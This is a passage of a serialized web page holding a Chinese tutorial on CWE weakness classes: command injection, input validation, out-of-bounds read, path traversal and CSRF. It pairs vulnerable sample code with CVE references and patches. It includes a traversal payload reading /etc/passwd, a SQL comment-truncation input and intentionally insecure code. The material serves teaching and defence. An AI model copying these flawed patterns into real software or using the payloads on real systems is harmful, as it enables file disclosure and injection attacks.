class=\\\"x-inline-link\\\"\u003ehttps://github.com/google/voice-builder/commit/c145d4604df67e6fc625992412eef0bf9a85e26b\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"原本的程序可以通过\u003ccode class=\\\"x-inline-highlight\\\"\u003ereq.query.text\u003c/code\u003e注入\u003ccode class=\\\"x-inline-highlight\\\"\u003ecmd\u003c/code\u003e。补丁对字符串过滤特殊字符，并用\u003ccode class=\\\"x-inline-highlight\\\"\u003echild.stdin.write(sanitizedText)\u003c/code\u003e代替\u003ccode class=\\\"x-inline-highlight\\\"\u003eecho\u003c/code\u003e命令。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"JavaScript\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$1f\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 96px, var(--bg-transparent-red) 96px 144px, transparent 144px, transparent 144px, var(--bg-transparent-green) 144px 168px, transparent 168px, transparent 192px, var(--bg-transparent-red) 192px 312px, transparent 312px, transparent 312px, var(--bg-transparent-green) 312px 336px, transparent 336px, transparent 528px, var(--bg-transparent-red) 528px 552px, transparent 552px, transparent 552px, var(--bg-transparent-green) 552px 576px, transparent 576px, transparent 792px, var(--bg-transparent-green) 792px 840px, transparent 840px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$20\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/20.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【C】CWE-20: Improper Input Validation\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"输入验证不当，程序接收输入或数据，但没有验证或者错误地验证输入是否具有安全正确地处理数据所需的属性。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"没有输入验证。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$birthday = $_GET['birthday'];\\n$homepage = $_GET['homepage'];\\necho \\\"生日：$birthday\u003cbr\u003e主页：\u003ca href=$homepage\u003e点击此处\u003c/a\u003e\\\"\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$birthday\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_GET\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'birthday'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$homepage\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_GET\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'homepage'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token keyword\\\"\u003eecho\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"生日：\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$birthday\u003c/span\u003e\u003c/span\u003e\u0026lt;br\u003e主页：\u0026lt;a href=\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$homepage\u003c/span\u003e\u003c/span\u003e\u003e点击此处\u0026lt;/a\u003e\\\"\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这段程序展示用户的生日和主页，但由于这些参数来自于HTTP请求，攻击者可以构造一个含有\u003ccode class=\\\"x-inline-highlight\\\"\u003escript\u003c/code\u003e标签的钓鱼链接，并通过参数传入，导致恶意脚本在客户端上执行。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"尽管开发者可以限制输入为整数和破折号，攻击者仍有可能提供以下形式的字符串：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"2009-01-09--\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"2009-01-09--\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"如果在SQL语句中使用这些数据，它会将语句的其余部分视为注释。注释可能会禁用语句中其他与安全相关的逻辑。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"XSS攻击或SQL注入只是输入验证不当可能出现的后果中的一小部分。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 2\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"有问题的输入验证。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Java\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"private void buildList(int untrustedListSize)\\n{\\n    if (0 \u003e untrustedListSize)\\n    {\\n        die(\\\"Negative value supplied for list size, die evil hacker!\\\");\\n    }\\n    Widget[] list = new Widget[untrustedListSize];\\n    list[0] = new Widget();\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$21\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这个示例尝试根据用户指定的值构建列表，并判断了提供值为负的情况，但还是忽略了输入\u003ccode class=\\\"x-inline-highlight\\\"\u003e0\u003c/code\u003e值的情况，可能导致后续抛出异常。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2008-2223\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2008-2223\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://www.exploit-db.com/exploits/5565\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://www.exploit-db.com/exploits/5565\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"vShare YouTube Clone 2.6中的\u003ccode class=\\\"x-inline-highlight\\\"\u003egroup_posts.php\u003c/code\u003e中的SQL注入漏洞，远程攻击者可以通过\u003ccode class=\\\"x-inline-highlight\\\"\u003etid\u003c/code\u003e参数执行任意SQL命令。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Perl\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$22\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 384px, var(--bg-transparent-golden) 384px 408px, transparent 408px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$23\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/125.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-125: Out-of-bounds Read\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"越界读取，在预期缓冲区末尾之后或开头之前读取。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"int getValueFromArray(int *array, int len, int index)\\n{\\n    int value;\\n\\n    // check that the array index is less than the maximum\\n    // length of the array\\n    if (index \u003c len)\\n    {\\n\\n        // get the value at the specified index of the array\\n        value = array[index];\\n    }\\n\\n    // if array index is invalid then output error message\\n    // and return value indicating error\\n    else\\n    {\\n        printf(\\\"Value is: %d\\\\n\\\", array[index]);\\n        value = -1;\\n    }\\n\\n    return value;\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$24\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这段代码只检查了\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex \u0026#60; len\u003c/code\u003e的情况；在判断条件中还应加入\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex \u0026#62;= 0\u003c/code\u003e。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2022-1452\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2022-1452\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://huntr.com/bounties/c8f4c2de-7d96-4ad4-857a-c099effca2d6\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://huntr.com/bounties/c8f4c2de-7d96-4ad4-857a-c099effca2d6\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/radareorg/radare2/commit/ecc44b6a2f18ee70ac133365de0e509d26d5e168\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/radareorg/radare2/commit/ecc44b6a2f18ee70ac133365de0e509d26d5e168\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"...\\noffset += 6;\\nif (attr) {\\n    attr-\u003etype = R_BIN_JAVA_ATTR_TYPE_BOOTSTRAP_METHODS_ATTR;\\n    if (offset + 8 \u003e sz)  {\\n        free (attr);\\n        return NULL;\\n    }\\n    attr-\u003einfo.bootstrap_methods_attr.num_bootstrap_methods = R_BIN_JAVA_USHORT (buffer, offset);\\n    offset += 2;\\n    attr-\u003einfo.bootstrap_methods_attr.bootstrap_methods = r_list_newf (r_bin_java_bootstrap_method_free);\\n...\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 120px, var(--bg-transparent-green) 120px 216px, transparent 216px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$25\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/22.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"“路径遍历”，产品使用外部输入来构建路径名，该路径名旨在识别位于受限父目录下的文件或目录。但通过使用特殊元素如\u003ccode class=\\\"x-inline-highlight\\\"\u003e../\u003c/code\u003e序列，如果没有经过中和处理，攻击者可能会访问到受限目录之外的文件。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"上述风险称为“相对路径遍历”，路径遍历还包括使用绝对路径名，例如\u003ccode class=\\\"x-inline-highlight\\\"\u003e/usr/local/bin\u003c/code\u003e，这称为“绝对路径遍历”。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"在许多编程语言中，注入空字节可能允许攻击者截断生成的文件名，以扩大攻击范围。例如，产品可能会将\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\".txt\\\"\u003c/code\u003e添加到路径名后以限制攻击者只能访问文本文件，但空注入可能会有效地消除此限制。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Perl\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"my $dataPath = \\\"/users/cwe/profiles\\\";\\nmy $username = param(\\\"user\\\");\\nmy $profilePath = $dataPath.\\\"/\\\".$username;\\n\\nopen(my $fh, \\\"\u003c\\\", $profilePath) || ExitError(\\\"profile read error: $profilePath\\\");\\nprint \\\"\u003cul\u003e\\\\n\\\";\\nwhile (\u003c$fh\u003e)\\n{\\n    print \\\"\u003cli\u003e$_\u003c/li\u003e\\\\n\\\";\\n}\\nprint \\\"\u003c/ul\u003e\\\\n\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$26\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e$username\u003c/code\u003e参数没有验证，攻击者可以构造：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"user=../../../etc/passwd\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"user=../../../etc/passwd\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"最终生成以下路径：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"/users/cwe/profiles/../../../etc/passwd\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"/users/cwe/profiles/../../../etc/passwd\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"等同于访问\u003ccode class=\\\"x-inline-highlight\\\"\u003e/etc/passwd\u003c/code\u003e。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 2\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"import os\\nimport sys\\ndef main():\\n    filename = sys.argv[1]\\n    path = os.path.join(os.getcwd(), filename)\\n    try:\\n        with open(path,'r') as f:\\n            file_data = f.read()\\n    except FileNotFoundError as    e:\\n        print(\\\"Error - file not found\\\")\\nmain()\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$27\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"上述代码会导致“绝对路径遍历”，\u003ccode class=\\\"x-inline-highlight\\\"\u003eos.path.join\u003c/code\u003e如果第二个参数传入绝对路径，则会弃用第一个参数\u003ccode class=\\\"x-inline-highlight\\\"\u003eos.getcwd()\u003c/code\u003e，直接使用第二个参数\u003ccode class=\\\"x-inline-highlight\\\"\u003efilename\u003c/code\u003e。那么传入\u003ccode class=\\\"x-inline-highlight\\\"\u003e/etc/passwd\u003c/code\u003e就可能导致同样的攻击。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"一个正确的做法是：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"import os\\nimport sys\\ndef main():\\n    filename = sys.argv[1]\\n    path = os.path.normpath(f\\\"{os.getcwd()}{os.sep}{filename}\\\")\\n    try:\\n        with open(path,'r') as f:\\n            file_data = f.read()\\n    except FileNotFoundError as    e:\\n        print(\\\"Error - file not found\\\")\\nmain()\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 120px, var(--bg-transparent-golden) 120px 144px, transparent 144px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$28\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2023-35947\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2023-35947\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/gradle/gradle/commit/1096b309520a8c315e3b6109a6526de4eabcb879\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/gradle/gradle/commit/1096b309520a8c315e3b6109a6526de4eabcb879\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/gradle/gradle/commit/2e5c34d57d0c0b7f0e8b039a192b91e5c8249d91\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/gradle/gradle/commit/2e5c34d57d0c0b7f0e8b039a192b91e5c8249d91\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"Gradle是一款构建工具，侧重于构建自动化和多语言开发支持。在受影响的版本中，当解压Tar压缩包时，Gradle不会检查文件是否可以写入解压位置之外。这可能导致重要文件在Gradle进程有写入权限的任何地方被覆盖。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"部分补丁的内容：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Java\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"String path = tarEntry.getName();\\nString path = safeEntryName(tarEntry);\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 24px, var(--bg-transparent-red) 24px 48px, transparent 48px, transparent 48px, var(--bg-transparent-green) 48px 72px, transparent 72px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token class-name\\\"\u003eString\u003c/span\u003e path \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e tarEntry\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token function\\\"\u003egetName\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token class-name\\\"\u003eString\u003c/span\u003e path \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token function\\\"\u003esafeEntryName\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003etarEntry\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"进一步去查找\u003ccode class=\\\"x-inline-highlight\\\"\u003esafeEntryName()\u003c/code\u003e的功能，溯源到\u003ca href=\\\"https://github.com/gradle/gradle/blob/master/platforms/core-runtime/files/src/main/java/org/gradle/internal/file/PathTraversalChecker.java\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ePathTraversalChecker.java\u003c/a\u003e中的以下代码：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Java\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$29\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 504px, var(--bg-transparent-golden) 504px 672px, transparent 672px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2a\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"其中的核心是高亮的\u003ccode class=\\\"x-inline-highlight\\\"\u003eisUnsafePathName()\u003c/code\u003e函数。\"}}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/352.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【Compo】CWE-352: Cross-Site Request Forgery (CSRF)\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"跨站请求伪造。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-gray\",\"children\":[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"详见\u003ca href=\\\"/24b/cross-site-request-forgery/\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eLearn CSRF\u003c/a\u003e。\"}}]}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2009-3022\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2009-3022\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"报告：\u003ca href=\\\"https://jvndb.jvn.jp/ja/contents/2009/JVNDB-2009-000058.html\\\" 